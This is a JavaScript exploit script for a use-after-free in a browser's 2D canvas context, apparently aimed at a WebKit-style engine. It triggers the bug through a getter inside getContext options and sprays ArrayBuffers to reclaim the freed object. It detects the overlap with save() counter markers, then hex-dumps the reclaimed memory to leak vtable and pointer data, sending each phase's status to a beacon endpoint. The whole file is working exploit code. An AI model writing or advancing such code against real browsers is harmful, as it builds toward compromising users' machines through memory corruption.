// p468-canvas-size-v2.js — Canvas UAF + AB reclaim with immediate beacons
// Fixes V465 GC crash by: (1) save() on freed-but-mapped memory before spray,
// (2) minimal post-UAF AB allocation (5 per size instead of 200),
// (3) immediate beacons for crash diagnostics
(function() {
    var RUN = 'p468-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : String(body));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // Phase 0: Pre-GC — trigger GC now so eden is clean for post-UAF work
    var trash = [];
    for (var i = 0; i < 10000; i++) trash.push({v: i});
    trash = null;
    var spin = 0;
    for (var i = 0; i < 500000; i++) spin += i;
    B('P0-GC', 'cleared');

    // Phase 1: Trigger UAF
    var c = document.createElement('canvas');
    c.width = 1; c.height = 1;
    document.body.appendChild(c);

    var innerCtx = null;
    var outerCtx = c.getContext('2d', {
        get desynchronized() {
            innerCtx = c.getContext('2d');
            return false;
        }
    });

    if (!innerCtx) {
        B('FAIL', 'no-innerCtx');
        return;
    }
    B('P1-UAF', 'ok');

    // Phase 2: save() on freed-but-mapped memory (BEFORE any AB spray)
    // At this point, the freed slot still has valid m_canvas (original canvas
    // still in DOM) → if GC runs, visitAdditionalChildren won't crash
    var MARKER1 = 42;
    try {
        for (var i = 0; i < MARKER1; i++) innerCtx.save();
        B('P2-PRESAVE', 'ok-' + MARKER1);
    } catch(e) {
        B('P2-PRESAVE-ERR', e.message);
        return;
    }

    // Phase 3: Spray ABs at candidate sizes — MINIMAL count to avoid GC
    // Try one size at a time with a fresh UAF each time for safety
    // First attempt: try a range of likely sizes with just 5 ABs each
    var sizes = [
        512, 576, 640, 704, 720, 736, 752, 768, 784, 800, 816, 832,
        848, 864, 880, 896, 912, 928, 960, 1024, 1088, 1152, 1216, 1280
    ];

    var PER = 5;
    var allABs = {};
    for (var si = 0; si < sizes.length; si++) {
        var sz = sizes[si];
        allABs[sz] = [];
        for (var j = 0; j < PER; j++) {
            allABs[sz].push(new ArrayBuffer(sz));
        }
    }
    B('P3-SPRAY', {numSizes: sizes.length, per: PER, total: sizes.length * PER});

    // Phase 4: save() again after spray — if AB reclaimed the slot, this writes to AB
    var MARKER2 = 35;
    try {
        for (var i = 0; i < MARKER2; i++) innerCtx.save();
        B('P4-POSTSAVE', 'ok-' + MARKER2);
    } catch(e) {
        B('P4-POSTSAVE-ERR', e.message);
    }

    // Phase 5: Scan all ABs for marker values
    // If AB reclaimed BEFORE our spray: marker = MARKER1 + MARKER2 = 77 (not zeroed)
    // If AB reclaimed DURING spray (calloc zeroed): marker = MARKER2 = 35
    // If not reclaimed: marker in freed memory, not in any AB
    var T1 = MARKER1 + MARKER2; // 77
    var T2 = MARKER2;           // 35

    var hits = [];
    for (var si = 0; si < sizes.length; si++) {
        var sz = sizes[si];
        var arr = allABs[sz];
        for (var j = 0; j < PER; j++) {
            var u32 = new Uint32Array(arr[j]);
            for (var off = 0; off < u32.length; off++) {
                var v = u32[off];
                if (v === T1 || v === T2 || v === MARKER1) {
                    hits.push({size: sz, idx: j, off4: off, byteOff: off * 4, val: v});
                    if (hits.length >= 10) break;
                }
            }
            if (hits.length >= 10) break;
        }
        if (hits.length >= 10) break;
    }

    if (hits.length > 0) {
        B('P5-HIT', JSON.stringify(hits.slice(0, 3)));

        // Confirm: save one more, check increment
        var h = hits[0];
        try {
            innerCtx.save();
            var newVal = new Uint32Array(allABs[h.size][h.idx])[h.off4];
            B('P5-CONFIRM', JSON.stringify({old: h.val, new: newVal, ok: newVal === h.val + 1}));
        } catch(e) {
            B('P5-CONFIRM-ERR', e.message);
        }

        // Dump the hit AB as hex (info leak!)
        var hitAB = allABs[h.size][h.idx];
        var u8 = new Uint8Array(hitAB);
        // Dump first 128 bytes (vtable + base class pointers)
        var hex0 = '';
        for (var i = 0; i < Math.min(128, u8.length); i++) hex0 += ('0' + u8[i].toString(16)).slice(-2);
        B('P5-DUMP0', hex0);
        // Dump bytes around the hit offset
        var start = Math.max(0, h.byteOff - 32);
        var end = Math.min(u8.length, h.byteOff + 64);
        var hexH = '';
        for (var i = start; i < end; i++) hexH += ('0' + u8[i].toString(16)).slice(-2);
        B('P5-DUMPH', start + ':' + hexH);
    } else {
        B('P5-MISS', 'no-hit');

        // Diagnostic: for each size, count any non-zero uint32 in ABs
        var nzSizes = {};
        for (si = 0; si < sizes.length; si++) {
            sz = sizes[si];
            arr = allABs[sz];
            for (j = 0; j < PER; j++) {
                u32 = new Uint32Array(arr[j]);
                for (off = 0; off < u32.length; off++) {
                    if (u32[off] !== 0) {
                        nzSizes[sz] = (nzSizes[sz] || 0) + 1;
                        break;
                    }
                }
            }
        }
        B('P5-DIAG', JSON.stringify(nzSizes));
    }

    B('DONE', RUN);
})();
